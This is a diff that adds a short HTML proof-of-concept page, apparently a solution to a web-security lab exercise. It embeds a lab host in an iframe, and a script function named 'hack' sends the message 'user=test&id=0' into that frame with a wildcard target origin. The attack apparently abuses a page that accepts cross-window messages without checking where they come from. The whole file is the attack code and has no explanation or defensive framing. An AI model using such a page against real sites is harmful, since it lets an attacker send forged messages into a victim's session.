@@ -1,0 +1,12 @@
+<html>
+<body>
+    <iframe id="myiframe" height="100%" width="100%" onclick="hack()" src="http://ptl-4863efd2-89405f01.libcurl.so/" frameborder="0"></iframe>
+    <script>
+        function hack(){
+            setTimeout(function(){
+                document.getElementById("myiframe").contentWindow.postMessage('user=test&id=0',"*");
+            },2000);
+        }
+    </script>
+</body>
+</html>
